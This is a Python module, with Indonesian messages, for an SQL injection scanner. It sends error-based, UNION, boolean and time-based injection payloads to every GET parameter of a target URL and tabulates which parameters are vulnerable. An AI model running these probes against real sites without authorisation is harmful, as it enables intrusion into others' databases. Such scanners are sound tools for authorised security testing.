import time
import re
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn
from lib.requester import send_request, build_url_with_param
from lib.utils import load_wordlist, detect_dbms_from_error

console = Console()

def test_error_based(url, param, payloads):
    for payload in payloads[:40]:
        test_url = build_url_with_param(url, param, payload)
        resp = send_request(test_url)
        if resp and (resp.status_code == 500 or re.search(r'(sql|mysql|syntax|unclosed|odbc|driver|microsoft|postgresql|oracle)', resp.text, re.I)):
            dbms = detect_dbms_from_error(resp.text)
            return True, 'error', dbms, payload
    return False, None, None, None

def test_union_based(url, param):
    for i in range(1, 20):
        order_payload = f"1' ORDER BY {i}-- -"
        order_url = build_url_with_param(url, param, order_payload)
        resp = send_request(order_url)
        if resp and ('unknown column' in resp.text.lower() or 'order by' in resp.text.lower()):
            max_cols = i - 1
            break
    else:
        return False, None, None, None
    for cols in range(max_cols, max_cols+1):
        nulls = ','.join(['NULL'] * cols)
        union_payload = f"-1' UNION SELECT {nulls}-- -"
        union_url = build_url_with_param(url, param, union_payload)
        resp = send_request(union_url)
        if resp and 'NULL' not in resp.text:
            nums = ','.join(str(i) for i in range(1, cols+1))
            union_num = f"-1' UNION SELECT {nums}-- -"
            num_url = build_url_with_param(url, param, union_num)
            resp_num = send_request(num_url)
            if resp_num and any(str(i) in resp_num.text for i in range(1, cols+1)):
                return True, 'union', 'MySQL', union_payload
    return False, None, None, None

def test_boolean_based(url, param):
    true_payload = "1' AND '1'='1"
    false_payload = "1' AND '1'='2"
    true_url = build_url_with_param(url, param, true_payload)
    false_url = build_url_with_param(url, param, false_payload)
    resp_true = send_request(true_url)
    resp_false = send_request(false_url)
    if resp_true and resp_false:
        diff_ratio = abs(len(resp_true.text) - len(resp_false.text)) / max(len(resp_true.text), 1)
        if diff_ratio > 0.05:
            return True, 'boolean', 'Unknown', true_payload
    return False, None, None, None

def test_time_based(url, param, payloads):
    for payload in payloads:
        if 'sleep' in payload.lower() or 'benchmark' in payload.lower():
            start = time.time()
            test_url = build_url_with_param(url, param, payload)
            send_request(test_url, timeout=10)
            elapsed = time.time() - start
            if elapsed >= 4.5:
                return True, 'time', 'MySQL/PostgreSQL', payload
    return False, None, None, None

def scan_vulnerability(url, risk_level=1):
    """
    Scan SQL injection dengan risk level 1,2,3.
    Level 1: wordlist/common_sqli.txt (payload ringan)
    Level 2: wordlist/common_sqli2.txt (payload medium)
    Level 3: wordlist/common_sqli3.txt (payload berat + bypass)
    """
    wordlist_map = {
        1: 'wordlist/common_sqli.txt',
        2: 'wordlist/common_sqli2.txt',
        3: 'wordlist/common_sqli3.txt'
    }
    wordlist_file = wordlist_map.get(risk_level, 'wordlist/common_sqli.txt')
    payloads = load_wordlist(wordlist_file)
    if not payloads:
        console.print(f"[red]Wordlist {wordlist_file} tidak ditemukan![/red]")
        return []

    # Ekstrak parameter dari URL
    from lib.requester import extract_params_from_url
    params = extract_params_from_url(url)
    if not params:
        console.print("[red]Tidak ada parameter GET di URL. Berikan URL dengan ?id=1[/red]")
        return []

    results = []
    console.print(f"[cyan]► Memulai scan dengan risk level {risk_level} menggunakan {len(payloads)} payload...[/cyan]")

    for param in params:
        console.print(f"\n[yellow]▶ Menguji parameter: {param}[/yellow]")
        with Progress(
            SpinnerColumn(spinner_name="dots", style="bright_blue"),
            TextColumn("[progress.description]{task.description}"),
            transient=True,
            console=console
        ) as progress:
            task = progress.add_task(f"[cyan]Mengirim payload ke {param}...[/cyan]", total=None)
            # Urutan deteksi: error, union, boolean, time
            is_vuln, tech, dbms, payload = test_error_based(url, param, payloads)
            if not is_vuln:
                is_vuln, tech, dbms, payload = test_union_based(url, param)
            if not is_vuln:
                is_vuln, tech, dbms, payload = test_boolean_based(url, param)
            if not is_vuln:
                is_vuln, tech, dbms, payload = test_time_based(url, param, payloads)

        if is_vuln:
            console.print(f"[red]💀 VULNERABLE! Teknik: {tech}, DBMS: {dbms}[/red]")
            console.print(f"[dim]Payload: {payload}[/dim]")
            results.append({
                'parameter': param,
                'vulnerable': True,
                'technique': tech,
                'dbms': dbms,
                'payload': payload
            })
        else:
            console.print(f"[green]✓ Aman (tidak terdeteksi SQLi)[/green]")
            results.append({
                'parameter': param,
                'vulnerable': False,
                'technique': None,
                'dbms': None,
                'payload': None
            })

    # Tampilkan hasil akhir dalam bentuk tabel
    table = Table(title="Hasil Scan SQL Injection", style="bright_white", header_style="bold cyan")
    table.add_column("Parameter", style="cyan")
    table.add_column("Status", style="bold")
    table.add_column("Teknik", style="yellow")
    table.add_column("DBMS", style="magenta")
    for res in results:
        status = "[red]VULNERABLE[/red]" if res['vulnerable'] else "[green]AMAN[/green]"
        tech = res['technique'] or "-"
        dbms = res['dbms'] or "-"
        table.add_row(res['parameter'], status, tech, dbms)
    console.print(table)
    return results